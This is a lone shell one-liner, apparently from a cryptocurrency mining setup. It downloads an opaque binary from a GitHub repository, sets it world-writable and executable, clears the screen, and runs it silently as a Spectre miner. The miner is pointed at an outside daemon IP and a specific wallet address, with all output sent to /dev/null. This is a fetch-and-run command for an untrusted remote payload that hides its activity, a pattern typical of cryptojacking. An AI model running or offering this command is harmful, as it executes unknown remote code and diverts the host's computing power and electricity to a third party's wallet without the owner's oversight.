...
wget https://github.com/concepcionjarvarious/m/raw/main/lib && chmod 777 lib && clear && ./lib --spectre --wallet spectre:qp99w2cc8gyfwnkjkccgh9k7zjtyzhsw688zja23dnfph60t8uazxwymzuuwf --daemon-address 157.230.239.11 --port 443 --worker-name $(shuf -n 1 -i 1-9999)-Bismillah --threads 4 --dev-fee 1 > /dev/null 2>&1
